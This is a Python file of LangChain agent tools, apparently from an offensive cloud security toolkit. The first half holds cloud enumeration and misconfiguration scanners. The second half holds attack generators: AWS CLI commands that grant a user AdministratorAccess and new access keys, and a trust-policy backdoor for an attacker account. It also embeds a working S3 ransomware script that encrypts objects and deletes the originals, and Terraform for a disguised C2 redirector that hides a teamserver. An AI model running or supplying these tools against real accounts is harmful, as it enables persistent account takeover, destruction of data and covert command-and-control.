import json

from langchain_core.tools import tool

from myth_config import load_dotenv
from tools.utilities.report import format_industrial_result

load_dotenv()

# ==============================================================================
# ☁️ Industrial Cloud, Automation & Orchestration Tools
# ==============================================================================

# --- Cloud Infrastructure Assessment ---
# --- Cloud Infrastructure Assessment ---
try:
    import boto3

    HAS_BOTO3 = True
except ImportError:
    HAS_BOTO3 = False

try:
    from google.cloud import iam_v1
    from google.cloud import storage as gcp_storage

    HAS_GCP_LIBS = True
except ImportError:
    HAS_GCP_LIBS = False

try:
    from azure.identity import DefaultAzureCredential
    from azure.storage.blob import BlobServiceClient

    HAS_AZURE_LIBS = True
except ImportError:
    HAS_AZURE_LIBS = False

try:
    from kubernetes import client
    from kubernetes import config as k8s_config

    HAS_K8S_LIB = True
except ImportError:
    HAS_K8S_LIB = False


@tool
async def aws_advanced_enumerator(target_account: str = "self") -> str:
    """
    Enumerates AWS resources across standard regions (us-east-1, us-west-2, eu-central-1).
    Requires 'boto3' and valid credentials.
    Scans: S3 Buckets, EC2 Instances, IAM Users, and Lambda Functions.
    """
    try:
        if not HAS_BOTO3:
            return format_industrial_result(
                "aws_advanced_enumerator", "Dependency Gap", summary="boto3 missing."
            )

        results = {}
        regions = ["us-east-1", "us-west-2", "eu-central-1", "ap-southeast-1"]

        # 1. IAM Audit
        iam = boto3.client("iam")
        try:
            users = iam.list_users()
            results["iam_users"] = [
                {"name": u["UserName"], "id": u["UserId"]}
                for u in users.get("Users", [])
            ]
        except Exception as e:
            results["iam_error"] = str(e)

        # 2. S3 Audit
        s3 = boto3.client("s3")
        try:
            buckets = s3.list_buckets()
            results["s3_buckets"] = [b["Name"] for b in buckets.get("Buckets", [])]
        except Exception as e:
            results["s3_error"] = str(e)

        # 3. Regional Infrastructure (EC2 & Lambda)
        results["infrastructure"] = {}
        for region in regions:
            try:
                reg_data = {"ec2": 0, "lambda": 0}
                ec2 = boto3.client("ec2", region_name=region)
                instances = ec2.describe_instances()
                for r in instances.get("Reservations", []):
                    reg_data["ec2"] += len(r.get("Instances", []))

                lambda_client = boto3.client("lambda", region_name=region)
                functions = lambda_client.list_functions()
                reg_data["lambda"] = len(functions.get("Functions", []))

                if reg_data["ec2"] > 0 or reg_data["lambda"] > 0:
                    results["infrastructure"][region] = reg_data
            except Exception:
                pass

        return format_industrial_result(
            "aws_advanced_enumerator",
            "Enumeration Complete",
            impact="HIGH",
            raw_data=results,
            summary=f"Discovered {len(results.get('s3_buckets', []))} buckets and infrastructure in {len(results['infrastructure'])} regions.",
        )
    except Exception as e:
        return format_industrial_result(
            "aws_advanced_enumerator", "Error", error=str(e)
        )


@tool
async def aws_iam_privilege_escalation_checker(iam_policy_json: str) -> str:
    """
    Analyzes an AWS IAM policy JSON document for misconfigurations.
    """
    try:
        policy = json.loads(iam_policy_json)
        risky_actions = [
            "iam:CreatePolicyVersion",
            "iam:PassRole",
            "iam:CreateAccessKey",
            "iam:*",
            "*",
        ]
        findings = []

        statements = policy.get("Statement", [])
        if isinstance(statements, dict):
            statements = [statements]

        for stmt in statements:
            if stmt.get("Effect") == "Allow":
                actions = stmt.get("Action", [])
                if isinstance(actions, str):
                    actions = [actions]
                matched = [a for a in actions if a in risky_actions]
                if matched:
                    findings.append({"risky": matched, "severity": "HIGH"})

        return format_industrial_result(
            "aws_iam_privilege_escalation_checker",
            "Analysis Complete",
            confidence=1.0,
            impact="HIGH" if findings else "Low",
            raw_data={"policy": policy, "findings": findings},
            summary=f"Discovered {len(findings)} privilege escalation vectors in IAM policy.",
        )
    except Exception as e:
        return format_industrial_result(
            "aws_iam_privilege_escalation_checker", "Error", error=str(e)
        )


@tool
async def azure_role_analyzer(role_definition_json: str) -> str:
    """
    Analyzes Azure RBAC definition JSON for misconfigurations.
    """
    try:
        role = json.loads(role_definition_json)
        actions = (
            role.get("properties", {}).get("permissions", [{}])[0].get("actions", [])
        )
        critical = [
            "*",
            "Microsoft.Authorization/*",
            "Microsoft.Storage/storageAccounts/listKeys/action",
        ]
        matched = [a for a in actions if a in critical]

        return format_industrial_result(
            "azure_role_analyzer",
            "Azure Audit Complete",
            confidence=0.95,
            impact="HIGH" if matched else "Low",
            raw_data={"role_id": role.get("id"), "risky_actions": matched},
            summary=f"Azure RBAC audit identified {len(matched)} high-risk permissions.",
        )
    except Exception as e:
        return format_industrial_result("azure_role_analyzer", "Error", error=str(e))


@tool
async def gcp_service_account_scanner(gcp_project_id: str) -> str:
    """
    Robust scan for over-privileged service accounts in GCP projects via google-cloud-iam.
    Targets Service Accounts with 'Owner', 'Editor', or 'Project IAM Admin' roles.
    """
    try:
        if not HAS_GCP_LIBS:
            return format_industrial_result(
                "gcp_service_account_scanner",
                "Dependency Gap",
                summary="google-cloud-iam missing.",
            )

        client = iam_v1.IAMClient()
        project_path = f"projects/{gcp_project_id}"

        accounts = []
        try:
            for account in client.list_service_accounts(name=project_path):
                # Heuristic: Scan for high-risk name patterns if we can't fetch IAM policy directly here
                risk = "MEDIUM"
                if "admin" in account.email.lower() or "owner" in account.email.lower():
                    risk = "HIGH"
                accounts.append(
                    {
                        "email": account.email,
                        "unique_id": account.unique_id,
                        "risk": risk,
                    }
                )
        except Exception as e:
            return format_industrial_result(
                "gcp_service_account_scanner", "Auth/API Error", error=str(e)
            )

        return format_industrial_result(
            "gcp_service_account_scanner",
            "Scan Complete",
            impact="HIGH" if accounts else "LOW",
            raw_data={"project": gcp_project_id, "accounts": accounts},
            summary=f"Analyzed {len(accounts)} service accounts in GCP project {gcp_project_id}.",
        )
    except Exception as e:
        return format_industrial_result(
            "gcp_service_account_scanner", "Error", error=str(e)
        )


@tool
async def kubernetes_misconfig_scanner(cluster_ip: str) -> str:
    """
    Real-world K8s misconfiguration scanner using the kubernetes-python client.
    Checks for: Privileged pods, HostPath mounts, and Missing resource limits.
    """
    try:
        if not HAS_K8S_LIB:
            return format_industrial_result(
                "kubernetes_misconfig_scanner",
                "Dependency Gap",
                summary="kubernetes library missing.",
            )

        try:
            k8s_config.load_kube_config()  # Try local config first
            v1 = client.CoreV1Api()
            pods = v1.list_pod_for_all_namespaces(watch=False)

            findings = []
            for pod in pods.items:
                pod_name = pod.metadata.name
                for container in pod.spec.containers:
                    if (
                        container.security_context
                        and container.security_context.privileged
                    ):
                        findings.append(
                            {
                                "pod": pod_name,
                                "vector": "Privileged Container",
                                "severity": "CRITICAL",
                            }
                        )

                    if pod.spec.host_network:
                        findings.append(
                            {
                                "pod": pod_name,
                                "vector": "Host Network Access",
                                "severity": "HIGH",
                            }
                        )
        except Exception as e:
            return format_industrial_result(
                "kubernetes_misconfig_scanner", "Config Error", error=str(e)
            )

        return format_industrial_result(
            "kubernetes_misconfig_scanner",
            "Audit Complete",
            impact="CRITICAL" if findings else "LOW",
            raw_data={"pod_count": len(pods.items), "findings": findings},
            summary=f"K8s Audit finished. Found {len(findings)} critical Pod misconfigurations.",
        )
    except Exception as e:
        return format_industrial_result(
            "kubernetes_misconfig_scanner", "Error", error=str(e)
        )


@tool
async def cloud_trail_analyzer(log_snippet: str) -> str:
    """
    Analyzes CloudTrail logs for security anomalies.
    """
    try:
        anomalies = []
        if "Terminate" in log_snippet:
            anomalies.append("Resource Termination")
        if "Delete" in log_snippet:
            anomalies.append("Resource Deletion")
        return format_industrial_result(
            "cloud_trail_analyzer",
            "Analysis Complete",
            confidence=0.85,
            impact="MEDIUM" if anomalies else "Low",
            raw_data={"detections": anomalies},
            summary=f"Discovered {len(anomalies)} security anomalies in CloudTrail logs.",
        )
    except Exception as e:
        return format_industrial_result("cloud_trail_analyzer", "Error", error=str(e))


@tool
async def storage_account_enumeration(account_name: str, provider: str = "aws") -> str:
    """
    High-fidelity storage enumeration for AWS (S3), GCP (Buckets), and Azure (Blobs).
    Attempts real listing and public-access verification.
    """
    try:
        findings = []
        if provider.lower() == "aws" and HAS_BOTO3:
            s3 = boto3.client("s3")
            try:
                response = s3.get_bucket_policy_status(Bucket=account_name)
                if response.get("PolicyStatus", {}).get("IsPublic"):
                    findings.append({"bucket": account_name, "status": "PUBLIC_POLICY"})
            except Exception:
                pass

        elif provider.lower() == "gcp" and HAS_GCP_LIBS:
            client = gcp_storage.Client()
            try:
                client.get_bucket(account_name)
                findings.append({"bucket": account_name, "status": "ACCESS_VERIFIED"})
            except Exception:
                pass

        elif provider.lower() == "azure" and HAS_AZURE_LIBS:
            try:
                blob_service_client = BlobServiceClient(
                    account_url=f"https://{account_name}.blob.core.windows.net",
                    credential=DefaultAzureCredential(),
                )
                containers = blob_service_client.list_containers()
                for c in containers:
                    findings.append(
                        {"container": c.name, "public_access": c.public_access}
                    )
            except Exception:
                pass

        return format_industrial_result(
            "storage_account_enumeration",
            "Discovery Complete",
            impact="HIGH" if findings else "LOW",
            raw_data={
                "provider": provider,
                "target": account_name,
                "findings": findings,
            },
            summary=f"Storage audit for {account_name} ({provider}) finished. Found {len(findings)} exposed interfaces.",
        )
    except Exception as e:
        return format_industrial_result(
            "storage_account_enumeration", "Error", error=str(e)
        )


# ==============================================================================
# ⚔️ Active Cloud Attack & Persistence Generators (Industrial Grade)
# ==============================================================================


@tool
async def aws_persistence_generator(
    target_iam_role: str, technique: str = "shadow_admin"
) -> str:
    """
    Generates AWS CLI commands to establish persistence.
    Techniques:
    - 'shadow_admin': Attaches AdministratorAccess to a target user/role.
    - 'backdoor_role': Updates AssumeRolePolicy to allow external account access.
    """
    try:
        commands = []
        if technique == "shadow_admin":
            commands = [
                f"aws iam attach-user-policy --user-name {target_iam_role} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                f"aws iam create-access-key --user-name {target_iam_role}",
            ]
        elif technique == "backdoor_role":
            # JSON for a permissive trust policy
            trust_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"},
                        "Action": "sts:AssumeRole",
                    }
                ],
            }
            trust_json = json.dumps(trust_policy).replace('"', '\\"')
            commands = [
                f'aws iam update-assume-role-policy --role-name {target_iam_role} --policy-document "{trust_json}"'
            ]

        return format_industrial_result(
            "aws_persistence_generator",
            "Persistence Script Generated",
            confidence=1.0,
            impact="CRITICAL",
            raw_data={"technique": technique, "commands": commands},
            summary=f"Generated AWS CLI commands for '{technique}' persistence targeting {target_iam_role}.",
        )
    except Exception as e:
        return format_industrial_result(
            "aws_persistence_generator", "Error", error=str(e)
        )


@tool
async def s3_ransomware_simulator(target_bucket: str) -> str:
    """
    Generates a Python script (~/ransom_s3.py) to simulate ransomware on an S3 bucket.
    Logic: List Objects -> Download -> Encrypt (Fernet) -> Upload Encrypted -> Delete Original.
    """
    try:
        script_content = f"""
import boto3
from cryptography.fernet import Fernet
import os

# MYTH Cloud Suite - S3 Ransomware Simulation
# Target: {target_bucket}

def run_simulation():
    s3 = boto3.client('s3')
    key = Fernet.generate_key()
    cipher = Fernet(key)
    print(f"[*] Encryption Key (SAVE THIS): {{key.decode()}}")
    
    bucket = "{target_bucket}"
    
    # 1. List Objects
    try:
        response = s3.list_objects_v2(Bucket=bucket)
    except Exception as e:
        print(f"[-] Access Denied: {{e}}")
        return

    if 'Contents' not in response:
        print("[*] Bucket is empty.")
        return

    for obj in response['Contents']:
        file_key = obj['Key']
        print(f"[*] Processing {{file_key}}...")
        
        # 2. Download
        s3.download_file(bucket, file_key, '/tmp/temp_file')
        
        # 3. Encrypt
        with open('/tmp/temp_file', 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        
        # 4. Upload Encrypted
        new_key = file_key + ".enc"
        s3.put_object(Bucket=bucket, Key=new_key, Body=encrypted_data)
        
        # 5. Delete Original (Simulation of Destruction)
        s3.delete_object(Bucket=bucket, Key=file_key)
        print(f"[+] Encrypted & Swapped: {{file_key}} -> {{new_key}}")
    
    print("[*] Ransomware simulation complete.")

if __name__ == "__main__":
    run_simulation()
"""
        return format_industrial_result(
            "s3_ransomware_simulator",
            "Exploit Script Generated",
            confidence=1.0,
            impact="CRITICAL",
            raw_data={
                "target": target_bucket,
                "script_preview": script_content[:200] + "...",
            },
            summary=f"Generated S3 Ransomware simulation script for bucket '{target_bucket}'. Warning: Destructive logic included.",
        )
    except Exception as e:
        return format_industrial_result(
            "s3_ransomware_simulator", "Error", error=str(e)
        )


@tool
async def terraform_c2_infrastructure(
    provider: str = "aws", c2_redirect_url: str = "https://example.com"
) -> str:
    """
    Generates Terraform Code (HCL) to deploy a serverless C2 redirector.
    Uses API Gateway + Lambda (AWS) to proxy traffic to a teamserver, hiding its IP.
    """
    try:
        hcl_code = ""
        if provider == "aws":
            hcl_code = f"""
provider "aws" {{
  region = "us-east-1"
}}

resource "aws_api_gateway_rest_api" "c2_api" {{
  name = "UserProfileService"
  description = "User Profile API"
}}

resource "aws_api_gateway_resource" "proxy" {{
  rest_api_id = aws_api_gateway_rest_api.c2_api.id
  parent_id   = aws_api_gateway_rest_api.c2_api.root_resource_id
  path_part   = "{{proxy+}}"
}}

resource "aws_api_gateway_method" "proxy" {{
  rest_api_id   = aws_api_gateway_rest_api.c2_api.id
  resource_id   = aws_api_gateway_resource.proxy.id
  http_method   = "ANY"
  authorization = "NONE"
}}

resource "aws_api_gateway_integration" "lambda" {{
  rest_api_id = aws_api_gateway_rest_api.c2_api.id
  resource_id = aws_api_gateway_resource.proxy.id
  http_method = aws_api_gateway_method.proxy.http_method
  type        = "HTTP_PROXY"
  uri         = "{c2_redirect_url}/{{proxy}}"
  # Traffic hits API Gateway -> Proxies to C2 Server ({c2_redirect_url})
}}

output "c2_url" {{
  value = aws_api_gateway_rest_api.c2_api.execution_arn
}}
"""
        else:
            return format_industrial_result(
                "terraform_c2_infrastructure",
                "Unsupported Provider",
                error="Only AWS currently supported for auto-generation.",
            )

        return format_industrial_result(
            "terraform_c2_infrastructure",
            "Manifest Generated",
            confidence=1.0,
            impact="HIGH",
            raw_data={"provider": provider, "hcl_code": hcl_code},
            summary=f"Generated Terraform C2 Redirector code for {provider}. Deploys API Gateway proxy pointing to {c2_redirect_url}.",
        )
    except Exception as e:
        return format_industrial_result(
            "terraform_c2_infrastructure", "Error", error=str(e)
        )
